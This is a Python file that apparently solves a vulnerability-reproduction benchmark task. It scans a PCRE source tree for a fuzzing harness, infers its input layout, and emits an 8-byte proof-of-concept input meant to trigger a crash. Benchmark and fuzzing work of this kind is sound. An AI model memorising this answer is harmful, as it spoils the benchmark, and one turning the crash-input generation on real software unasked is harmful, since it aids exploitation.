import os
import re
import struct
import tarfile
from typing import Iterable, List, Optional, Tuple


class Solution:
    def _iter_source_files_from_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh"}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                    if st.st_size > 2_000_000:
                        continue
                    with open(path, "rb") as f:
                        yield path, f.read()
                except OSError:
                    continue

    def _iter_source_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh"}
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    _, ext = os.path.splitext(m.name)
                    if ext.lower() not in exts:
                        continue
                    if m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        b = f.read()
                        yield m.name, b
                    except Exception:
                        continue
        except Exception:
            return

    def _iter_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_source_files_from_dir(src_path)
        else:
            yield from self._iter_source_files_from_tar(src_path)

    def _best_harness_text(self, src_path: str) -> str:
        best_score = -1
        best_text = ""
        for name, b in self._iter_source_files(src_path):
            if not b:
                continue
            try:
                text = b.decode("utf-8", errors="ignore")
            except Exception:
                continue

            score = 0
            if "LLVMFuzzerTestOneInput" in text:
                score += 50
            if re.search(r"\bmain\s*\(", text):
                score += 10
            if "ovector" in text:
                score += 10
            if "pcre_exec" in text or "pcre2_match" in text or "pcre_dfa_exec" in text or "pcre2_dfa_match" in text:
                score += 10
            if "Data" in text and "Size" in text:
                score += 3
            if re.search(r"Size\s*<\s*8", text):
                score += 5
            if re.search(r"Data\s*\+\s*4", text):
                score += 2
            if re.search(r"\bfread\s*\(", text) or re.search(r"\bfgets\s*\(", text) or re.search(r"\bgetline\s*\(", text):
                score += 1

            if score > best_score:
                best_score = score
                best_text = text

        return best_text

    def _detect_two_u32_len_format(self, text: str) -> bool:
        if not text:
            return False
        if "LLVMFuzzerTestOneInput" not in text:
            return False
        if not re.search(r"Size\s*<\s*8", text):
            return False
        if not re.search(r"Data\s*\+\s*4", text):
            return False
        if "uint32_t" in text or "uint32" in text or "U32" in text:
            return True
        if re.search(r"\*\s*\(\s*const\s*uint32_t\s*\*\s*\)\s*Data", text):
            return True
        return False

    def _detect_disallow_empty(self, text: str, kind: str) -> bool:
        if not text:
            return False
        # Look for typical checks preventing empty pattern/subject.
        # This is heuristic and intentionally conservative.
        k = re.escape(kind)
        patterns = [
            rf"\b{k}\w*\s*==\s*0\b",
            rf"\b{k}\w*\s*<=\s*0\b",
            rf"\bif\s*\(\s*!\s*{k}\w*\s*\)",
            rf"\bif\s*\(\s*{k}\w*\s*==\s*0\s*\)",
        ]
        return any(re.search(p, text) for p in patterns)

    def solve(self, src_path: str) -> bytes:
        text = self._best_harness_text(src_path)

        # Default candidate (ground-truth length 8)
        default_poc = b"\x00" * 8

        if self._detect_two_u32_len_format(text):
            disallow_pat_empty = self._detect_disallow_empty(text, "pat") or self._detect_disallow_empty(text, "pattern")
            disallow_sub_empty = self._detect_disallow_empty(text, "sub") or self._detect_disallow_empty(text, "subject")

            pattern = b"" if not disallow_pat_empty else b"a"
            subject = b"" if not disallow_sub_empty else b"a"

            poc = struct.pack("<II", len(pattern), len(subject)) + pattern + subject
            if len(poc) <= 8:
                return poc
            return poc

        return default_poc